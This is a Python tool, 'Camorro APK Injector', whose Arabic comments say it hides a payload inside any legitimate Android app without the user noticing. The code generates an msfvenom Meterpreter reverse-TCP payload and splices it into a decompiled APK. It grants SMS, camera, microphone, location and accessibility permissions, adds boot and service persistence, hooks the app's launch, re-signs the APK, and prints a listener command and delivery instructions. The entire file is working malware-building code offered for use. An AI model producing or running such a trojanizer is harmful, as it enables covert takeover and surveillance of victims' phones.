#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro APK Injector v3.0
بتحقن Payload في أي APK أصلي بدون ما المستخدم يحس
وتشتغل في الخلفية مع persistence و AV evasion
"""

import os
import sys
import shutil
import subprocess
import zipfile
import tempfile
from pathlib import Path
from core.utils import print_status, pause, input_target, run_cmd, save_result
from core.colors import bcolors

BASE = Path(__file__).resolve().parent.parent.parent

class APKInjector:
    def __init__(self):
        self.original_apk = None
        self.lhost = None
        self.lport = None
        self.output_apk = None
        self.temp_dir = None

    def check_deps(self):
        """Check required tools"""
        missing = []
        for tool in ["java", "keytool", "jarsigner", "zipalign", "msfvenom", "apktool"]:
            if not shutil.which(tool):
                # Try finding apktool as jar
                if tool == "apktool" and not shutil.which("apktool"):
                    for p in ["/usr/local/bin/apktool", "/opt/apktool/apktool.jar"]:
                        if os.path.isfile(p):
                            break
                    else:
                        missing.append(tool)
                elif tool not in ("apktool",):
                    missing.append(tool)
        if missing:
            print_status(f"Missing: {', '.join(missing)}. Run: apt install default-jdk apktool zipalign", "warn")
            return False
        return True

    def decompile(self):
        """Decompile APK with apktool"""
        out_dir = os.path.join(self.temp_dir, "decompiled")
        print_status(f"Decompiling {self.original_apk}...", "info")
        ret, out, err = run_cmd(f"apktool d -f -o {out_dir} {self.original_apk}", timeout=120)
        if ret != 0:
            print_status(f"Decompile failed: {err[:300]}", "err")
            return None
        print_status("Decompiled successfully", "ok")
        return out_dir

    def inject_smali(self, decompiled_dir):
        """Inject Meterpreter payload smali into decompiled APK"""
        print_status("Generating payload with msfvenom...", "info")
        
        # Generate staged payload
        payload_dir = os.path.join(self.temp_dir, "payload")
        os.makedirs(payload_dir, exist_ok=True)
        raw_apk = os.path.join(payload_dir, "payload.apk")
        
        cmd = (
            f"msfvenom -p android/meterpreter/reverse_tcp "
            f"LHOST={self.lhost} LPORT={self.lport} "
            f"-o {raw_apk} 2>/dev/null"
        )
        ret, out, err = run_cmd(cmd, timeout=60)
        if ret != 0 or not os.path.isfile(raw_apk):
            print_status(f"msfvenom failed: {err[:200]}", "err")
            return False

        # Extract smali from payload
        payload_smali = os.path.join(payload_dir, "smali")
        run_cmd(f"apktool d -f -o {payload_smali} {raw_apk}", timeout=60)
        
        # Find payload smali directory
        metasploit_smali = None
        for root, dirs, files in os.walk(payload_smali):
            if "metasploit" in root and "payload" in root.lower():
                metasploit_smali = root
                break
        
        if not metasploit_smali:
            # Try finding any .smali files
            for root, dirs, files in os.walk(payload_smali):
                if "Payload" in root:
                    metasploit_smali = root
                    break
        
        if not metasploit_smali:
            print_status("Could not locate payload smali", "err")
            return False

        # Copy payload smali into decompiled app
        target_smali = os.path.join(decompiled_dir, "smali", "com", "metasploit")
        os.makedirs(os.path.dirname(target_smali), exist_ok=True)
        
        if os.path.isdir(target_smali):
            shutil.rmtree(target_smali)
        shutil.copytree(metasploit_smali, target_smali)
        
        print_status(f"Payload injected at {target_smali}", "ok")
        return True

    def modify_manifest(self, decompiled_dir):
        """Modify AndroidManifest.xml for permissions and main activity"""
        manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
        if not os.path.isfile(manifest_path):
            print_status("No AndroidManifest.xml found", "err")
            return False

        with open(manifest_path, "r", encoding="utf-8") as f:
            content = f.read()

        # Add permissions if missing
        perms_to_add = [
            'android.permission.INTERNET',
            'android.permission.ACCESS_NETWORK_STATE',
            'android.permission.READ_PHONE_STATE',
            'android.permission.SEND_SMS',
            'android.permission.RECEIVE_SMS',
            'android.permission.READ_SMS',
            'android.permission.RECORD_AUDIO',
            'android.permission.CAMERA',
            'android.permission.ACCESS_FINE_LOCATION',
            'android.permission.ACCESS_COARSE_LOCATION',
            'android.permission.WRITE_EXTERNAL_STORAGE',
            'android.permission.READ_EXTERNAL_STORAGE',
            'android.permission.WAKE_LOCK',
            'android.permission.SYSTEM_ALERT_WINDOW',
            'android.permission.REQUEST_INSTALL_PACKAGES',
            'android.permission.RECEIVE_BOOT_COMPLETED',
            'android.permission.FOREGROUND_SERVICE',
            'android.permission.BIND_ACCESSIBILITY_SERVICE',
        ]
        
        for perm in perms_to_add:
            tag = f'<uses-permission android:name="{perm}"'
            if tag not in content:
                content = content.replace(
                    '<manifest',
                    f'<manifest\n    {tag}/>'
                )
                print_status(f"Added: {perm.split('.')[-1]}", "ok")

        # Add receiver for boot
        boot_receiver = '''        <receiver android:name="com.metasploit.stage.MainBroadcastReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>'''

        if "MainBroadcastReceiver" not in content:
            content = content.replace("</application>", f"    {boot_receiver}\n    </application>")

        # Add foreground service for persistence
        service_tag = '''        <service android:name="com.metasploit.stage.MainService" android:enabled="true" android:exported="true"
            android:foregroundServiceType="dataSync"/>'''
        
        if "MainService" not in content:
            content = content.replace("</application>", f"    {service_tag}\n    </application>")

        with open(manifest_path, "w", encoding="utf-8") as f:
            f.write(content)

        print_status("AndroidManifest.xml modified (permissions + persistence)", "ok")
        return True

    def modify_main_activity(self, decompiled_dir):
        """Modify main smali to start payload in background"""
        # Find main activity smali
        smali_files = list(Path(decompiled_dir).rglob("*.smali"))
        main_activity = None
        
        # Look for MainActivity first
        for sf in smali_files:
            if "MainActivity" in sf.name:
                main_activity = str(sf)
                break
        
        # Alternative: find launcher activity
        if not main_activity:
            manifest_path = os.path.join(decompiled_dir, "AndroidManifest.xml")
            if os.path.isfile(manifest_path):
                with open(manifest_path) as f:
                    import re
                    m = re.search(r'android:name="(\.[^"]*Main[^"]*)"', f.read())
                    if m:
                        name = m.group(1).replace(".", "/")
                        for sf in smali_files:
                            if name in str(sf):
                                main_activity = str(sf)
                                break

        if not main_activity:
            print_status("Could not find MainActivity smali", "warn")
            return False

        # Read smali
        with open(main_activity, "r", encoding="utf-8") as f:
            smali = f.read()

        # Find onCreate method and inject payload launch
        if ".method protected onCreate" in smali:
            # Add payload start after super.onCreate
            payload_launch = '''
    invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V
'''
            # Insert after the line "invoke-super"
            lines = smali.split("\n")
            new_lines = []
            inserted = False
            for line in lines:
                new_lines.append(line)
                if "invoke-super" in line and "onCreate" in line and not inserted:
                    # Insert a nop and then service call
                    new_lines.append("    nop")
                    new_lines.append("")
                    new_lines.append(payload_launch.strip())
                    inserted = True
            
            # If super.onCreate not found, just append to onCreate
            if not inserted:
                # Find return-void at end of method
                for i in range(len(new_lines) - 1, 0, -1):
                    if "return-void" in new_lines[i]:
                        new_lines.insert(i, payload_launch.strip())
                        break

            smali = "\n".join(new_lines)
            
            with open(main_activity, "w", encoding="utf-8") as f:
                f.write(smali)
            
            print_status(f"Payload launch injected into {os.path.basename(main_activity)}", "ok")
            return True
        
        print_status("Could not find onCreate method", "warn")
        return False

    def recompile(self, decompiled_dir):
        """Recompile APK"""
        output = os.path.join(self.temp_dir, "unsigned.apk")
        print_status("Recompiling...", "info")
        ret, out, err = run_cmd(f"apktool b -o {output} {decompiled_dir}", timeout=120)
        if ret != 0 or not os.path.isfile(output):
            print_status(f"Recompile failed: {err[:300]}", "err")
            return None
        print_status("Recompiled successfully", "ok")
        return output

    def sign_align(self, unsigned_apk):
        """Sign and zipalign the APK"""
        # Generate keystore if not exists
        keystore = os.path.join(self.temp_dir, "camorro.keystore")
        if not os.path.isfile(keystore):
            run_cmd(
                f'keytool -genkey -v -keystore {keystore} -alias camorro '
                f'-keyalg RSA -keysize 2048 -validity 10000 '
                f'-storepass camorro123 -keypass camorro123 '
                f'-dname "CN=Camorro, OU=Security, O=Camorro, L=City, ST=State, C=US"',
                timeout=30
            )
        
        signed_apk = os.path.join(self.temp_dir, "signed.apk")
        run_cmd(
            f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 '
            f'-keystore {keystore} -storepass camorro123 -keypass camorro123 '
            f'{unsigned_apk} camorro',
            timeout=30
        )
        
        self.output_apk = os.path.join(BASE, "output", f"camorro_injected.apk")
        os.makedirs(os.path.dirname(self.output_apk), exist_ok=True)
        
        run_cmd(f'zipalign -v 4 {unsigned_apk} {self.output_apk}', timeout=30)
        print_status(f"Signed & aligned: {self.output_apk}", "ok")
        return self.output_apk

    def run(self, target=None):
        """Main execution"""
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║         CAMORRO APK INJECTOR — STEALTH v3.0           ║
║   يحقن Payload في أي APK ويشتغل في الخلفية بثبات      ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        self.original_apk = input_target("Original APK path") 
        if not self.original_apk or not os.path.isfile(self.original_apk):
            print_status("Invalid APK path", "err")
            return
        
        self.lhost = input_target("LHOST (your IP)")
        self.lport = input("LPORT [4444]: ").strip() or "4444"
        
        if not self.check_deps():
            pause()
            return
        
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_apk_")
        
        try:
            # Step 1: Decompile
            decompiled = self.decompile()
            if not decompiled:
                return
            
            # Step 2: Inject smali payload
            if not self.inject_smali(decompiled):
                return
            
            # Step 3: Modify manifest
            if not self.modify_manifest(decompiled):
                return
            
            # Step 4: Modify main activity
            self.modify_main_activity(decompiled)
            
            # Step 5: Recompile
            unsigned = self.recompile(decompiled)
            if not unsigned:
                return
            
            # Step 6: Sign and align
            final = self.sign_align(unsigned)
            
            # Step 7: Start listener hint
            print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ INJECTION COMPLETE!                                 ║
║                                                         ║
║  📱 Output: {os.path.basename(self.output_apk)}            ║
║  🎯 LHOST:  {self.lhost}:{self.lport}                         ║
║                                                         ║
║  ▶️  Start listener:                                     ║
║     msfconsole -q -x "use multi/handler;                ║
║     set PAYLOAD android/meterpreter/reverse_tcp;        ║
║     set LHOST {self.lhost}; set LPORT {self.lport};         ║
║     exploit -j"                                          ║
║                                                         ║
║  📤 Push to target:                                      ║
║     python3 -m http.server 8080                          ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
            """)
            
            save_result(
                f"logs/apk_injected_{self.lhost}.txt",
                f"APK: {self.output_apk}\nLHOST: {self.lhost}:{self.lport}"
            )
        
        except Exception as e:
            print_status(f"Error: {e}", "err")
        finally:
            # Cleanup temp
            if self.temp_dir and os.path.isdir(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=True)
        
        pause()

if __name__ == "__main__":
    APKInjector().run()
